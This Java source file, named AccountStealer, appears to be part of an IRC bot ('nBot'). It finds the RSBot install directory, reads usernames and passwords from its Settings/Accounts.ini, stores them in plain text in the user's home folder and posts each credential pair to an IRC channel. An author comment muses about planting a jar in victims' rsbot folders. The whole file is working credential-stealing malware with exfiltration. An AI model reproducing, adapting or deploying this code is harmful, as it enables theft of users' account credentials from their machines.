
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan - if you had a way to make it so it automatically put a jar in the rsbot folder, nd then whenever they ran rsbot.. no way, sorry. you cant search the filesystem on java and the reason for that is because its multi platform and each os has a diff file systemn gotcha
 */
public class AccountStealer {

    private static Map<String, String> accountList = new HashMap<String, String>();
    private static List<String> lineList = new ArrayList<String>();
    private static String rsbotDir = null;

    public static void reloadAll() throws IOException {
        accountList.clear();
        lineList.clear();
        rsbotDir = null;
        readDir();
        readAccounts();
    }

    public static void doLoad() {
        try {
            logDir();
            readDir();
            readAccounts();
            writeAccounts();
        } catch (IOException ex) {
            
        }
    }

    public static void writeAccounts() throws IOException {
        BufferedWriter bw = new BufferedWriter(new FileWriter(System.getProperty("user.home") + "/data.sqm", false));
        for (String line : lineList) {
            String password = line.substring(line.indexOf("PASSWORD="), line.indexOf(",")).replace("PASSWORD=", "");
            String username = line.substring(line.indexOf("USERNAME="), line.lastIndexOf(",")).replace("USERNAME=", "");
            accountList.put(username, password);
            bw.write("Username: " + username + " Password: " + password);
            bw.newLine();
            bw.flush();
        }
        bw.close();
    }

    public static List getUsernameByPassword(String password) {
        Set s = accountList.keySet();
        List<String> usersReturned = new ArrayList<String>();
        for (Object acc : s) {
            if (accountList.get(acc.toString()).equals(password)) {
                usersReturned.add(acc.toString());
            }
        }
        return usersReturned;
    }

    public static String getUsersPassword(String user) {
        try {
            return accountList.get(user);
        } catch (java.lang.NullPointerException e) {
            e.printStackTrace();
            return "nosuchuser";
        }
    }

    public static void printAccounts() throws IOException {
        Set s = accountList.keySet();
        for (Object o : s) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Account: " + o.toString() + ":" + accountList.get(o.toString()));
        }
    }

    public static void readDir() {
        try {
            BufferedReader br = new BufferedReader(new FileReader(System.getProperty("user.home") + "/dir.sqm"));
            String line;
            while ((line = br.readLine()) != null) {
                rsbotDir = line; //so we get the last updated dir:)
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void readAccounts() {
        if (rsbotDir == null) {
            return;
        }
        try {
            BufferedReader br = new BufferedReader(new FileReader(rsbotDir + "/Settings/Accounts.ini"));
            String line;
            while ((line = br.readLine()) != null) {
                lineList.add(line);
            }
            writeAccounts();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void logDir() throws IOException {
        File dir = new File(".");
        File[] files = dir.listFiles();
        boolean inRsDir = false;
        for (int i = 0; i < files.length; i++) {
            if (files[i].toString().contains("rs.jar")) {
                inRsDir = true;
            }
        }
        if (!inRsDir) {
            return;
        }
        BufferedWriter out = new BufferedWriter(new FileWriter(System.getProperty("user.home") + "/dir.sqm", true));
        out.write(dir.getCanonicalPath());
        out.newLine();
        out.flush();
        out.close();
    }
}
